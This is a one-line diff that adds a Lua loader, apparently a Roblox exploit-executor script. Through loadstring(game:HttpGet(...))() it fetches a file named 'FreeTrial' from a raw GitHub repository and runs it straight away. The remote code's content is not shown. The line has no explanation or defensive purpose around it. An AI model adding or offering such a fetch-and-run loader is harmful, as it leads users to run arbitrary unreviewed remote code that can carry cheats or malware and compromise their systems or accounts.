@@ -1,0 +1,1 @@
+loadstring(game:HttpGet"https://raw.githubusercontent.com/ThxSir/Ture/main/FreeTrial")();
